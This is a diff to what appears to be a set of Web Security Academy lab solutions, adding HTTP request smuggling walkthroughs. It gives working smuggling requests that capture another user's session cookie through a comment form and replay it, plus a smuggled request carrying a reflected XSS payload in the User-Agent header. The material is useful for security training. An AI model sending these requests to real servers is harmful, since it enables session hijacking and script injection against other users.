@@ -247,3 +247,54 @@ Content-Length: 10
 
 x=
 ```
+
+### Exploiting HTTP request smuggling to capture other users' requests
+Repeat the attack until the next refresh is without error: 
+```
+POST / HTTP/1.1
+Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 323
+
+0
+
+POST /post/comment HTTP/1.1
+Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 585
+Cookie: session=9hj8i51OHzaciLprwoDlAmwElyptUvqA
+
+csrf=VLe2ebCmhGG941T4MLdjYtdOPFOJvsPU&postId=1&name=Jan+Verner&email=xxx%40gmail.com&website=&comment=
+```
+
+Once successful, a new comment is added:
+```
+GET / HTTP/1.1 Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/338621 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate, br Cookie: session=buqpdsiu1uTzQN5tSOvGtTCVtpXIjhux
+```
+
+Grab the cookie and get `/` with it
+```
+GET / HTTP/1.1
+Host: ac5a1f671eb2c7da8086025b00c300e3.web-security-academy.net
+Cookie: session=buqpdsiu1uTzQN5tSOvGtTCVtpXIjhux
+```
+
+### Exploiting HTTP request smuggling to deliver reflected XSS
+Send repeatedly:
+```
+POST / HTTP/1.1
+Host: ac921f6f1ed2cd8a80094450003d004b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 222
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=3 HTTP/1.1
+Host: ac921f6f1ed2cd8a80094450003d004b.web-security-academy.net
+User-Agent: a"/><script>alert('hello')</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
